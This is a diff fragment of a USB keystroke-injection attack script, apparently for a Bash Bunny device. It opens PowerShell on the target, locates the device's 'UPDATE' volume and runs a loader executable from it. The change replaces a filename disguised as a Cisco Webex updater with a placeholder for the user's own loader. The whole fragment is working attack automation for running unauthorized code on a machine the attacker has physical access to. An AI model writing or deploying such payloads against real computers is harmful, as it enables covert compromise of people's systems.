@@ -21,7 +21,7 @@ Q STRING "start .\\powershell.exe"
 Q ENTER
 Q DELAY 500
 LED ATTACK
-Q STRING ".((gwmi win32_volume -f 'label=''UPDATE''').Name+'payloads\\$SWITCH_POSITION\Cisco-Webex-Updater.exe')"
+Q STRING ".((gwmi win32_volume -f 'label=''UPDATE''').Name+'payloads\\$SWITCH_POSITION\<REPLACE WITH YOUR LOADER>.exe')"
 Q ENTER
 Q DELAY 15000
 Q ALT F4
